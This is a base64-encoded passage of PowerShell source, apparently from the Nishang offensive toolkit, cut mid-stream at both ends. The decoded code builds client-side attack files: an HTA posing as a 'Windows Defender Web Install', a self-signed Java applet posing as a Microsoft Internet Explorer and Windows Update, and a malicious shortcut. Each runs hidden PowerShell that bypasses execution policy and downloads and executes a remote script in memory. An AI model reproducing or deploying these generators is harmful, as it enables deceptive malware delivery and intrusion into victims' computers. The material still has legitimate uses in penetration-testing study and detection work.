jdXRlIG9uIHRoZSB0YXJnZXQuCgouUEFSQU1FVEVSIFBheWxvYWRVUkwKVVJMIG9mIHRoZSBwb3dlcnNoZWxsIHNjcmlwdCB3aGljaCB3b3VsZCBiZSBleGVjdXRlZCBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBBcmd1bWVudHMKQXJndW1lbnRzIHRvIHRoZSBwb3dlcnNoZWxsIHNjcmlwdCB0byBiZSBleGVjdXRlZCBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBIVEFGaWxlUGF0aApQYXRoIHRvIHRoZSBIVEEgZmlsZSB0byBiZSBnZW5lcmF0ZWQuIERlZmF1bHQgaXMgd2l0aCB0aGUgbmFtZSBXaW5kRGVmX1dlYkluc3RhbGwuaHRhIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4KCi5QQVJBTUVURVIgVkJGaWxlbmFtZQpOYW1lIG9mIHRoZSBWQlNjcmlwdCBmaWxlIHRvIGJlIGdlbmVyYXRlZCwgdXNlIHdpdGhvdXQgIi52YnMiIGV4dGVuc2lvbi4gRGVmYXVsdCBpcyBsYXVuY2hwcy52YnMuCgouUEFSQU1FVEVSIFZCRmlsZXBhdGgKUGF0aCB0byB0aGUgSFRBIGZpbGUgdG8gYmUgZ2VuZXJhdGVkLiBEZWZhdWx0IGlzIHdpdGggdGhlIG5hbWUgbGF1bmNocHMudmJzIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4KCi5FWEFNUExFClBTID4gT3V0LUhUQSAtUGF5bG9hZCAicG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLW5vcHJvZmlsZSAtbm9leGl0IC1jIEdldC1DaGlsZEl0ZW0iCgpBYm92ZSBjb21tYW5kIHdvdWxkIGV4ZWN1dGUgR2V0LUNoaWxkSXRlbSBvbiB0aGUgdGFyZ2V0IG1hY2hpbmUgd2hlbiB0aGUgSFRBIGlzIG9wZW5lZC4KCi5FWEFNUExFClBTID4gT3V0LUhUQSAtUGF5bG9hZFVSTCBodHRwOi8vMTkyLjE2OC4yNTQuMS9HZXQtSW5mb3JtYXRpb24ucHMxCgpVc2UgYWJvdmUgY29tbWFuZCB0byBnZW5lcmF0ZSBIVEEgYW5kIFZCUyBmaWxlcyB3aGljaCBkb3dubG9hZCBhbmQgZXhlY3V0ZSB0aGUgZ2l2ZW4gcG93ZXJzaGVsbCBzY3JpcHQgaW4gbWVtb3J5IG9uIHRhcmdldC4KCi5FWEFNUExFClBTID4gT3V0LUhUQSAtUGF5bG9hZFVSTCBodHRwOi8vMTkyLjE2OC4yNTQuMS9wb3dlcnByZXRlci5wc20xIC1Bcmd1bWVudHMgQ2hlY2stVk0KClVzZSBhYm92ZSBjb21tYW5kIHRvIHBhc3MgYW4gYXJndW1lbnQgdG8gdGhlIHBvd2Vyc2hlbGwgc2NyaXB0L21vZHVsZS4KCi5MSU5LCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTQvMTEvcG93ZXJzaGVsbC1mb3ItY2xpZW50LXNpZGUtYXR0YWNrcy5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWQsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUGF5bG9hZFVSTCwKCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQXJndW1lbnRzLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRWQkZpbGVuYW1lPSJsYXVuY2hwcy52YnMiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRIVEFGaWxlUGF0aD0iJHB3ZFxXaW5kRGVmX1dlYkluc3RhbGwuaHRhIiwKCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFZCRmlsZXBhdGg9IiRwd2RcbGF1bmNocHMudmJzIgogICAgKQogICAgCiAgICBpZighJFBheWxvYWQpCiAgICB7CiAgICAgICAgJFBheWxvYWQgPSAicG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLW5vcHJvZmlsZSAtYyBJRVggKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCckUGF5bG9hZFVSTCcpKTskQXJndW1lbnRzIgogICAgfQogICAgCiAgICAkSFRBID0gQCIKICAgIDwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4KICAgIDxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4KICAgIDxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIC8+CiAgICA8dGl0bGU+V2luZG93cyBEZWZlbmRlciBXZWIgSW5zdGFsbDwvdGl0bGU+CiAgICA8c2NyaXB0IHNyYz0iJFZCRmlsZW5hbWUiIHR5cGU9InRleHQvdmJzY3JpcHQiID4KICAgIDwvc2NyaXB0PgogICAgPGh0YTphcHBsaWNhdGlvbgogICAgICAgaWQ9Im9IVEEiCiAgICAgICBhcHBsaWNhdGlvbm5hbWU9IldpbmRvd3MgRGVmZW5kZXIgV2ViIEluc3RhbGwiCiAgICAgICBhcHBsaWNhdGlvbj0ieWVzIgogICAgPgogICAgPC9odGE6YXBwbGljYXRpb24+CiAgICA8L2hlYWQ+CgogICAgPFNDUklQVCBUWVBFPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgZnVuY3Rpb24gc3RhcnQoKXsKCiAgICBJbml0aWFsaXplKCk7CgogICAgfQogICAgLy8tLT4KICAgIDwvU0NSSVBUPgogICAgPGRpdj4gCiAgICA8b2JqZWN0IHR5cGU9InRleHQvaHRtbCIgZGF0YT0iaHR0cDovL3dpbmRvd3MubWljcm9zb2Z0LmNvbS9lbi1JTi93aW5kb3dzNy9wcm9kdWN0cy9mZWF0dXJlcy93aW5kb3dzLWRlZmVuZGVyIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj4KICAgIDwvb2JqZWN0PjwvZGl2PiAgIAogCiAgCiAgICA8Ym9keSBvbmxvYWQ9InN0YXJ0KCkiPgogICAgPC9ib2R5PgogICAgPC9odG1sPgoiQAoKICAgICR2YnNzY3JpcHQgPSBAIgogICAgU3ViIEluaXRpYWxpemUoKQogICAgU2V0IG9TaGVsbCA9IENyZWF0ZU9iamVjdCggIldTY3JpcHQuU2hlbGwiICkKICAgIHBzID0gIiRQYXlsb2FkIgogICAgb1NoZWxsLnJ1bihwcyksMCx0cnVlCiAgICBFbmQgU3ViCiJACgogICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICRIVEEgLUZpbGVQYXRoICRIVEFGaWxlcGF0aAogICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICR2YnNzY3JpcHQgLUZpbGVQYXRoICRWQkZpbGVwYXRoCiAgICBXcml0ZS1PdXRwdXQgIkhUQSBhbmQgVkJTIHdyaXR0ZW4gdG8gJEhUQUZpbGVwYXRoIGFuZCAkVkJGaWxlcGF0aCByZXNwZWN0aXZlbHkuIgp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjT3V0LUphdmEjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIE91dC1KYXZhCnsKCjwjCi5TWU5PUFNJUwpOaXNoYW5nIHNjcmlwdCB3aGljaCBjb3VsZCBiZSB1c2VkIGZvciBnZW5lcmF0aW5nIEpBUiB0byBiZSB1c2VkIGZvciBhcHBsZXRzLgoKLkRFU0NSSVBUSU9OClRoZSBzY3JpcHQgZ2VuZXJhdGVzIGEgU2lnbmVkIEpBUiBhbmQgb25lIGxpbmUgSFRNTCBjb2RlLiBUaGVzZSBjb3VsZCBiZSBkZXBsb3llZCBvbiBhIHdlYiBzZXJ2ZXIuIFdoZW4gYSB0YXJnZXQgb3BlbnMKdXAgdGhlIFVSTCBob3N0aW5nIHRoZXNlLCB0aGUgcHJlZGVmaW5lZCBQb3dlclNoZWxsIGNvbW1hbmRzIGFuZCBzY3JpcHRzIGNvdWxkIGJlIGV4ZWN1dGVkIG9uIHRoZSB0YXJnZXQuCgpJZiB5b3Ugd2FudCB0byB1c2UgdmFsaWQvdHJ1c3RlZCBjZXJ0aWZpY2F0ZSBmb3Igc2lnbmluZyB1c2UgdGhlIC1Ob1NlbGZTaWduIG9wdGlvbi4KClRoZSBKQVIgZ2VuZXJhdGVkIGNoZWNrcyBmb3IgdGhlIE9TIGFyY2hpdGVjdHVyZSBhbmQgY2FsbHMgdGhlIDMyLWJpdCB2ZXJzaW9uIG9mIFBvd2VyU2hlbGwgZm9yIHNjcmlwdCBleGVjdXRpb24uClNvIHlvdSBuZWVkIHRvIHBhc3Mgb25seSB0aGUgMzIgYml0IHNoZWxsY29kZSB0byBpdC4gSW4gY2FzZSB5b3Ugd291bGQgbGlrZSB0byB1c2UgNjQgYml0IFBvd2VyU2hlbGwsIHJlbW92ZSB0aGUgImlmIgpjb25kaXRpb24gbWFya2VkIGluIHRoZSBzb3VyY2Ugb2YgSmF2YSBjb2RlIGJlaW5nIGdlbmVyYXRlZC4KClRoZSBzY3JpcHQgbmVlZHMgSkRLIHRvIGJlIGluc3RhbGxlZCBvbiB0aGUgYXR0YWNrZXIncyBtYWNoaW5lLiBUaGUgcGFyYW1ldGVycyBwYXNzZWQgdG8ga2V5dG9vbCBhbmQgamFyc2lnbmVyCmNvdWxkIGJlIGNoYW5nZWQgaW4gdGhlIHNvdXJjZSBmb3IgZnVydGhlciBjdXN0b21pemF0aW9uLiBUaG9zZSBhcmUgbm90IGFza2VkIGFzIGZ1bmN0aW9uIHBhcmFtZXRlcnMgdG8ga2VlcCB0aGUgCm51bWJlciBvZiBwYXJhbWV0ZXJzIGxlc3MgZm9yIGVhc3kgdXNhZ2UuCgouUEFSQU1FVEVSIFBheWxvYWQKUGF5bG9hZCB3aGljaCB5b3Ugd2FudCBleGVjdXRlIG9uIHRoZSB0YXJnZXQuCgouUEFSQU1FVEVSICRQYXlsb2FkVVJMClVSTCBvZiB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgd2hpY2ggd291bGQgYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgJEFyZ3VtZW50cwpBcmd1bWVudHMgdG8gdGhlIHBvd2Vyc2hlbGwgc2NyaXB0IHRvIGJlIGV4ZWN1dGVkIG9uIHRoZSB0YXJnZXQuCgouUEFSQU1FVEVSICRKREtQYXRoClBhdGogdG8gdGhlIEpESyB0byBjb21waWxlIHRoZSAuSmF2YSBjb2RlLgoKLlBBUkFNRVRFUiAkT3V0cHV0UGF0aApQYXRoIHRvIHRoZSBkaXJlY3Rvcnkgd2hlcmUgdGhlIGZpbGVzIHdvdWxkIGJlIHNhdmVkLiBEZWZhdWx0IGlzIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4KCi5QQVJBTUVURVIgJE5vU2VsZlNpZ24KVXNlIHRoaXMgc3dpdGNoIGlmIHlvdSBkb24ndCB3YW50IHRvIGNyZWF0ZSBhIHNlbGYgc2lnbmVkIGNlcnRpZmljYXRlIGZvciBzaWduaW5nIHRoZSBKQVIuCgouRVhBTVBMRQpQUyA+IE91dC1KYXZhIC1QYXlsb2FkICJHZXQtUHJvY2VzcyIgLUpES1BhdGggIkM6XFByb2dyYW0gRmlsZXNcSmF2YVxqZGsxLjcuMF8yNSIKCkFib3ZlIGNvbW1hbmQgd291bGQgZXhlY3V0ZSBHZXQtUHJvY2VzcyBvbiB0aGUgdGFyZ2V0IG1hY2hpbmUgd2hlbiB0aGUgSkFSIG9yIENsYXNzIGZpbGUgaXMgZXhlY3V0ZWQuCgouRVhBTVBMRQpQUyA+IE91dC1KYXZhIC1QYXlsb2FkVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xL0dldC1JbmZvcm1hdGlvbi5wczEgLUpES1BhdGggIkM6XFByb2dyYW0gRmlsZXNcSmF2YVxqZGsxLjcuMF8yNSIKClVzZSBhYm92ZSBjb21tYW5kIHRvIGdlbmVyYXRlIEpBUiB3aGljaCBkb3dubG9hZCBhbmQgZXhlY3V0ZSB0aGUgZ2l2ZW4gcG93ZXJzaGVsbCBzY3JpcHQgaW4gbWVtb3J5IG9uIHRhcmdldC4KCi5FWEFNUExFClBTID4gT3V0LUphdmEgLVBheWxvYWQgIi1lIDxFbmNvZGVkU2NyaXB0PiIgLUpES1BhdGggIkM6XFByb2dyYW0gRmlsZXNcSmF2YVxqZGsxLjcuMF8yNSIKClVzZSBhYm92ZSBjb21tYW5kIHRvIGdlbmVyYXRlIEpBUiB3aGljaCBleGVjdXRlcyB0aGUgZW5jb2RlZCBzY3JpcHQuClVzZSBJbnZva2UtQ29tbWFuZCBmcm9tIE5pc2hhbmcgdG8gZW5jb2RlIHRoZSBzY3JpcHQuCgouRVhBTVBMRQpQUyA+IE91dC1KYXZhIC1QYXlsb2FkVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xL3Bvd2VycHJldGVyLnBzbTEgLUFyZ3VtZW50cyBDaGVjay1WTSAtSkRLUGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xKYXZhXGpkazEuNy4wXzI1IgoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gcGFzcyBhbiBhcmd1bWVudCB0byB0aGUgcG93ZXJzaGVsbCBzY3JpcHQvbW9kdWxlLgoKLkVYQU1QTEUKUFMgPiBPdXQtSmF2YSAtUGF5bG9hZFVSTCBodHRwOi8vMTkyLjE2OC4yNTQuMS9wb3dlcnByZXRlci5wc20xIC1Bcmd1bWVudHMgQ2hlY2stVk0gLUpES1BhdGggIkM6XFByb2dyYW0gRmlsZXNcSmF2YVxqZGsxLjcuMF8yNSIgLU5vU2VsZlNpZ24KCkR1ZSB0byB0aGUgdXNlIG9mIC1Ob1NlbGZTaWduIGluIGFib3ZlIGNvbW1hbmQsIG5vIHNlbGYgc2lnbmVkIGNlcnRpZmljYXRlIHdvdWxkIGJlIHVzZWQgdG8gc2lnbiB0aCBKQVIuCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE0LzExL3Bvd2Vyc2hlbGwtZm9yLWNsaWVudC1zaWRlLWF0dGFja3MuaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgoKCgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUGF5bG9hZCwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXlsb2FkVVJMLAoKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRBcmd1bWVudHMsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSkRLUGF0aCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0cHV0UGF0aD0iJHB3ZCIsCgogICAgICAgIFtzd2l0Y2hdCiAgICAgICAgJE5vU2VsZlNpZ24KCgogICAgKQoKCiAgICBpZighJFBheWxvYWQpCiAgICB7CiAgICAgICAgJFBheWxvYWQgPSAiSUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnJFBheWxvYWRVUkwnKSk7JEFyZ3VtZW50cyIKICAgIH0gICAgCgojSmF2YSBjb2RlIHRha2VuIGZyb20gdGhlIFNvY2lhbCBFbmdpbm5lcmluZyBUb29sa2l0IChTRVQpIGJ5IERhdmlkIEtlbm5lZHkKICAgICRKYXZhQ2xhc3MgPSBAIgppbXBvcnQgamF2YS5hcHBsZXQuKjsKaW1wb3J0IGphdmEuYXd0Lio7CmltcG9ydCBqYXZhLmlvLio7CnB1YmxpYyBjbGFzcyBKYXZhUFMgZXh0ZW5kcyBBcHBsZXQgewpwdWJsaWMgdm9pZCBpbml0KCkgewpQcm9jZXNzIGY7Ci8vaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy80NzQ4NjczL2hvdy1jYW4taS1jaGVjay10aGUtYml0bmVzcy1vZi1teS1vcy11c2luZy1qYXZhLWoyc2Utbm90LW9zLWFyY2gvNTk0MDc3MCM1OTQwNzcwClN0cmluZyBhcmNoID0gU3lzdGVtLmdldGVudigiUFJPQ0VTU09SX0FSQ0hJVEVDVFVSRSIpOwpTdHJpbmcgd293NjRBcmNoID0gU3lzdGVtLmdldGVudigiUFJPQ0VTU09SX0FSQ0hJVEVXNjQzMiIpOwpTdHJpbmcgcmVhbEFyY2ggPSBhcmNoLmVuZHNXaXRoKCI2NCIpIHx8IHdvdzY0QXJjaCAhPSBudWxsICYmIHdvdzY0QXJjaC5lbmRzV2l0aCgiNjQiKSA/ICI2NCIgOiAiMzIiOwpTdHJpbmcgY21kID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLW5vbG9nbyAtbm9wcm9maWxlICRQYXlsb2FkIjsKLy9SZW1vdmUgdGhlIGJlbG93IGlmIGNvbmRpdGlvbiB0byB1c2UgNjQgYml0IHBvd2Vyc2hlbGwgb24gNjQgYml0IG1hY2hpbmVzLgppZiAocmVhbEFyY2ggPT0gIjY0IikKewogICAgY21kID0gIkM6XFxXaW5kb3dzXFxTeXNXT1c2NFxcV2luZG93c1Bvd2VyU2hlbGxcXHYxLjBcXHBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLW5vbG9nbyAtbm9wcm9maWxlICRQYXlsb2FkIjsKfQp0cnkgewpmID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjbWQpOwp9CmNhdGNoKElPRXhjZXB0aW9uIGUpIHsKZS5wcmludFN0YWNrVHJhY2UoKTsKfQpQcm9jZXNzIHM7Cn0KfQoiQAoKCiAgICAjQ29tcGlsZSB0aGUgSmF2YSBmaWxlCiAgICAkSmF2YUZpbGUgPSAiJE91dHB1dFBhdGhcSmF2YVBTLmphdmEiCiAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJEphdmFDbGFzcyAtRW5jb2RpbmcgYXNjaWkgLUZpbGVQYXRoICRKYXZhRmlsZQogICAgJEphdmFjUGF0aCA9ICIkSkRLUGF0aCIgKyAiXGJpblxqYXZhYy5leGUiCiAgICAmICIkSmF2YWNQYXRoIiAiJEphdmFGaWxlIgoKICAgICNDcmVhdGUgYSBtYW5pZmVzdCBmb3IgSkFSLCB0YWtlbiBmcm9tIFNFVAogICAgJE1hbmlmZXN0ID0gQCIKUGVybWlzc2lvbnM6IGFsbC1wZXJtaXNzaW9ucwpDb2RlYmFzZTogKgpBcHBsaWNhdGlvbi1OYW1lOiBNaWNyb3NvZnQgSW50ZXJuZXQgRXhwbG9yZXIgVXBkYXRlIChTRUNVUkUpCiJACiAgICAkTWFuaWZlc3RGaWxlID0gIiRPdXRwdXRQYXRoXG1hbmlmZXN0LnR4dCIKICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkTWFuaWZlc3QgLUVuY29kaW5nIGFzY2lpIC1GaWxlUGF0aCAkTWFuaWZlc3RGaWxlCgogICAgI0NyZWF0ZSB0aGUgSkFSCiAgICAkSmFycGF0aCA9ICIkSkRLUGF0aCIgKyAiXGJpblxqYXIuZXhlIgogICAgJiAiJEphclBhdGgiICItY3ZmbSIgIiRPdXRwdXRQYXRoXEphdmFQUy5qYXIiICIkTWFuaWZlc3RGaWxlIiAiSmF2YVBTLmNsYXNzIgogICAgCiAgICAjUGFyYW1ldGVycyBwYXNzZWQgdG8ga2V5dG9vbCBhbmQgamFyc2lnbmVyLiBZb3UgbWF5IGNoYW5nZSB0aGVzZSB0byB5b3VyIGNob2ljZS4KICAgICRLZXlzdG9yZUFsaWFzID0gIlNpZ25BcHBsZXQiCiAgICAkS2V5U3RvcmUgPSAiUFNLZXlzdG9yZSIKICAgICRTdG9yZVBhc3MgPSAiUFNLZXlzdG9yZVBhc3MiCiAgICAkS2V5UGFzcyA9ICJQU0tleVBhc3MiCiAgICAkRE5hbWUgPSAiY249V2luZG93cyBVcGRhdGUsIG91PU1pY3Jvc29mdCBJbmMsIG89TWljcm9zb2Z0IEluYywgYz1VUyIKCiAgICBpZiAoJE5vU2VsZlNpZ24gLWVxICRGYWxzZSkKICAgIHsKICAgICAgICAjR2VuZXJhdGUgYSBrZXlwYWlyIGZvciBzZWxmLXNpZ25pbmcKICAgICAgICAjaHR0cDovL3J2bnNlYy53b3JkcHJlc3MuY29tLzIwMTQvMDkvMDEvcHMxZW5jb2RlLXBvd2Vyc2hlbGwtZm9yLWRheXMvCiAgICAgICAgJEtleXRvb2xQYXRoID0gIiRKREtQYXRoIiArICJcYmluXGtleXRvb2wuZXhlIgogICAgICAgICYgIiRLZXl0b29sUGF0aCIgIi1nZW5rZXlwYWlyIiAiLWFsaWFzIiAiJEtleXN0b3JlQWxpYXMiICIta2V5c3RvcmUiICIkS2V5U3RvcmUiICIta2V5cGFzcyIgIiRLZXlQYXNzIiAiLXN0b3JlcGFzcyIgIiRTdG9yZVBhc3MiICItZG5hbWUiICIkRE5hbWUiCgogICAgICAgICNTZWxmIHNpZ24gdGhlIEpBUgogICAgICAgICRKYXJTaWduZXJQYXRoID0gIiRKREtQYXRoIiArICJcYmluXGphcnNpZ25lci5leGUiCiAgICAgICAgJiAiJEphclNpZ25lclBhdGgiICIta2V5c3RvcmUiICIkS2V5U3RvcmUiICItc3RvcmVwYXNzIiAiJFN0b3JlUGFzcyIgIi1rZXlwYXNzIiAiJEtleVBhc3MiICItc2lnbmVkamFyIiAiJE91dHB1dFBhdGhcU2lnbmVkSmF2YVBTLmphciIgIiRPdXRwdXRQYXRoXEphdmFQUy5qYXIiICJTaWduQXBwbGV0IgogICAgCiAgICAgICAgI091dHB1dCBzaW1wbGUgaHRtbC4gVGhpcyBjb3VsZCBiZSB1c2VkIHdpdGggYW55IGNsb25lZCB3ZWIgcGFnZS4KICAgICAgICAjSG9zdCB0aGlzIEhUTUwgYW5kIFNpZ25lZEphclBTLmphciBvbiBhIHdlYiBzZXJ2ZXIuCiAgICAgICAgJEhUTUxDb2RlID0gQCcKICAgICAgICA8ZGl2PiAKICAgIDxvYmplY3QgdHlwZT0idGV4dC9odG1sIiBkYXRhPSJodHRwOi8vd2luZG93cy5taWNyb3NvZnQuY29tL2VuLUlOL2ludGVybmV0LWV4cGxvcmVyL2luc3RhbGwtamF2YSIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSI+CiAgICA8L29iamVjdD48L2Rpdj4KICAgIDxhcHBsZXQgY29kZT0iSmF2YVBTIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIiBhcmNoaXZlPSJTaWduZWRKYXZhUFMuamFyIiA+IDwvYXBwbGV0PicKJ0AKICAgICAgICAkSFRNTEZpbGUgPSAiJE91dHB1dFBhdGhcYXBwbGV0Lmh0bWwiCiAgICAgICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICRIVE1MQ29kZSAtRW5jb2RpbmcgYXNjaWkgLUZpbGVQYXRoICRIVE1MRmlsZSAgIAoKICAgICAgICAjQ2xlYW51cAogICAgICAgIFJlbW92ZS1JdGVtICIkT3V0cHV0UGF0aFxQU0tleVN0b3JlIgogICAgICAgIFJlbW92ZS1JdGVtICIkT3V0cHV0UGF0aFxKYXZhUFMqIgogICAgfQogICAgZWxzZWlmICgkTm9TZWxmU2lnbiAtZXEgJFRydWUpCiAgICB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiWW91IGNob3NlIG5vdCB0byBzZWxmIHNpZ24uIFVzZSB5b3VyIHZhbGlkIGNlcnRpZmljYXRlIHRvIHNpZ24gdGhlIEphdmFQUy5qYXIgbWFudWFsbHkuIgogICAgICAgICNDbGVhbnVwCiAgICAgICAgUmVtb3ZlLUl0ZW0gIiRPdXRwdXRQYXRoXEphdmFQUy5qYXZhIgogICAgICAgIFJlbW92ZS1JdGVtICIkT3V0cHV0UGF0aFxKYXZhUFMuY2xhc3MiCiAgICB9ICAgIAogICAgI0NsZWFudXAgdG8gcmVtb3ZlIHRlbXBvcmFyeSBmaWxlcwogICAgUmVtb3ZlLUl0ZW0gIiRPdXRwdXRQYXRoXG1hbmlmZXN0LnR4dCIKfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI091dC1TaG9ydGN1dCMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gT3V0LVNob3J0Y3V0CnsKPCMKLlNZTk9QU0lTCk5pc2hhbmcgc2NyaXB0IHdoaWNoIGNyZWF0ZXMgYSBzaG9ydGN1dCBjYXBhYmxlIG9mIGxhdW5jaGluZyBQb3dlclNoZWxsIGNvbW1hbmRzIGFuZCBzY3JpcHRzLgoKLkRFU0NSSVBUSU9OClRoZSBzY3JpcHQgZ2VuZXJhdGVzIGEgc2hvcnRjdXQgKC5sbmspLiBXaGVuIGEgdGFyZ2V0IG9wZW5zIHRoZSBzaG9ydGN1dCwgdGhlIHByZWRlZmluZWQgcG93ZXJzaGVsbCBzY3JpcHRzIGFuZC9vciBjb21tYW5kcyBnZXQgZXhlY3V0ZWQuCkEgaG90a2V5IGZvciB0aGUgc2hvcnRjdXQgY291bGQgYWxzbyBiZSBnZW5lcmF0ZWQuIEFsc28sIHRoZSBpY29uIG9mIHRoZSBzaG9ydGN1dCBjb3VsZCBiZSBzZXQgdG9vLgoKLlBBUkFNRVRFUiBQYXlsb2FkClBheWxvYWQgd2hpY2ggeW91IHdhbnQgZXhlY3V0ZSBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBQYXlsb2FkVVJMClVSTCBvZiB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgd2hpY2ggd291bGQgYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgQXJndW1lbnRzCkFyZ3VtZW50cyB0byB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgdG8gYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgT3V0cHV0UGF0aApQYXRoIHRvIHRoZSAubG5rIGZpbGUgdG8gYmUgZ2VuZXJhdGVkLiBEZWZhdWx0IGlzIHdpdGggdGhlIG5hbWUgU2hvcnRjdXQgdG8gRmlsZSBTZXJ2ZXIubG5rIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4KCi5QQVJBTUVURVIgSG90a2V5ClRoZSBIb3RrZXkgdG8gYmUgYXNzaWduZWQgdG8gdGhlIHNob3J0Y3V0LiBEZWZhdWx0IGlzIEY1LgoKLlBBUkFNRVRFUiBJY29uClRoZSBJY29uIHRvIGJlIGFzc2lnbmVkIHRvIHRoZSBnZW5lcmF0ZWQgc2hvcnRjdXQuIERlZmF1bHQgaXMgdGhhdCBvZiBleHBsb3Jlci5leGUKCi5FWEFNUExFClBTID4gT3V0LVNob3J0Y3V0IC1QYXlsb2FkICItV2luZG93U3R5bGUgaGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1ub3Byb2ZpbGUgLW5vZXhpdCAtYyBHZXQtQ2hpbGRJdGVtIgoKQWJvdmUgY29tbWFuZCB3b3VsZCBleGVjdXRlIEdldC1DaGlsZEl0ZW0gb24gdGhlIHRhcmdldCBtYWNoaW5lIHdoZW4gdGhlIHNob3J0Y3V0IGlzIG9wZW5lZC4gTm90ZSB